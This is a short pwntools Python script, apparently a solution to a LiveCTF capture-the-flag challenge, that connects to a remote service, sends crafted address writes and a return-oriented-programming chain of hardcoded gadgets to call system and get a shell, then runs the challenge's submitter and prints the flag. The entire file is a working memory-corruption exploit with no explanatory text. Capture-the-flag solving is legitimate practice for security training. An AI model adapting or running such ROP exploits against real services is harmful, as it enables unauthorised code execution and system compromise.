from pwn import *

#r = gdb.debug("./challenge", 'b *0x401A55')
#r = process("./challenge", 'b *0x401A55')
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))

def do_write(data):
    #r.sendlineafter(b'Addr pls: ', str(data).encode())
    r.sendlineafter(b'Addr pls: ', hex(data)[2:])

#gdb.attach(r)

for _ in range(3):
    do_write(0x414141414141)
do_write(0x0000000400000001)

#for _ in range(1):
#    do_write(0x414141414141)
system = 0x4050E0
sh1 = 0x480479
sh2 = 0x20080
prdip = 0x0000000000402218 #: pop rdi ; pop rbp ; ret
prsip = 0x0000000000469470 # : pop rsi ; pop rbp ; ret
prdx = 0x0000000000487213 # : pop rdx ; leave ; ret
syscall = 0x0000000000401311 # : syscall
gadget = 0x0000000000487212 # : pop rax ; pop rdx ; leave ; ret
add_gadget = 0x0000000000471885 #: add rax, rdi ; ret
#0x0000000000436945 : mov qword ptr [rsi], rax ; ret
# 0x0000000000426499 : mov rax, rdi ; ret
# 0x0000000000472b90 : mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret

#0x000000000042529a : push rax ; ret
do_system = 0x401914

#buffer = 
rop = []
rop += [prdip, sh1, 1]
rop += [0x0000000000426499]
rop += [prdip, sh2, 1]
rop += [0x0000000000471885]
rop += [do_system]

for x in rop:
    do_write(x)
r.sendline('.')

time.sleep(1)
r.sendline('./submitter')
# print(r.recvall(timeout=1))
warning('%s', r.recvline_contains(b'LiveCTF{').decode().strip())

r.close()
exit(0)
